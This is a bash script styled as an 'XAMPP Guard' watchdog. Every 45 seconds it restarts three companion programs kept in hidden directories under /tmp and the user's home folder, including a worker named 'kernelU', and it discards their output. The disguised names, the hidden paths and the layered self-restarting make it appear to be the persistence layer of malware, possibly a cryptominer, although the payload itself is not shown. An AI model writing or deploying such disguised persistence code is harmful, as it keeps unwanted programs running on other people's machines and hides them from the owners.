#!/bin/bash
# ============================================
# XAMPP Guard - 3rd Layer Watchdog
# Role: Ensure monitor.sh, watchdog.sh & kernelU keep running
# ============================================

GUARD_DIR="$HOME/.xampp-guard"
MAIN_DIR="$HOME/.xampp-healthcheck"
HELPER_DIR="/tmp/.xampp-helper"

MONITOR_SCRIPT="$HELPER_DIR/monitor.sh"
WATCHDOG_SCRIPT="$MAIN_DIR/watchdog.sh"
WORKER_SCRIPT="$MAIN_DIR/kernelU"

PID_FILE="$GUARD_DIR/.guard.pid"
LOG_FILE="$GUARD_DIR/guard.log"
INTERVAL=45

# Create directory (HOME-based, no sudo needed)
mkdir -p "$GUARD_DIR"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [GUARD] $1" >> "$LOG_FILE"
}

ensure_running() {
    local name="$1"
    local script="$2"
    local pattern="$3"

    if ! pgrep -f "$pattern" > /dev/null; then
        log "[!] $name is dead. Restarting..."
        if [ -f "$script" ]; then
            chmod +x "$script"
            nohup bash "$script" > /dev/null 2>&1 &
            log "[✓] $name restarted"
        else
            log "[x] $name script not found: $script"
        fi
    fi
}

main() {
    if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
        echo "[-] Guard is already running"
        exit 1
    fi

    echo $$ > "$PID_FILE"
    log "========================================"
    log "[+] Guard started (PID: $$)"
    log "========================================"

    trap 'log "[!] Guard terminated"; rm -f "$PID_FILE"; exit 0' SIGTERM SIGINT

    while true; do
        ensure_running "Monitor"  "$MONITOR_SCRIPT"  "$MONITOR_SCRIPT"
        ensure_running "Watchdog" "$WATCHDOG_SCRIPT" "$WATCHDOG_SCRIPT"
        ensure_running "Worker"   "$WORKER_SCRIPT"   "$WORKER_SCRIPT"
        sleep "$INTERVAL"
    done
}

main "$@"